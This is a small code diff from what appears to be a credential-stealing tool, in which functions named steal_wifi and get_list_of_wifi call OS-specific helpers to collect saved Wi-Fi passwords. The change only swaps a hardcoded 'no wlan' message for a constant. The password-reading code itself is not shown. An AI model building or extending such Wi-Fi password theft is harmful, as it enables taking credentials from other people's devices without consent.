@@ -39,7 +39,7 @@ def steal_wifi():
     if config.os_name == constants.Linux_OS:
         stolen_passwords = steal_wifi_linux()
     if stolen_passwords == None:
-        return "Seems like device haven't wlan."
+        return constants.seems_like_you_havent_wlan
     return stolen_passwords
 
 
@@ -123,7 +123,7 @@ def get_list_of_wifi():
     if config.os_name == constants.Linux_OS:
         list_of_wifi = get_list_of_wifi_linux()
     if list_of_wifi == None or list_of_wifi == '':
-        return "Seems like device haven't wlan."
+        return constants.seems_like_you_havent_wlan
     return list_of_wifi
 
 
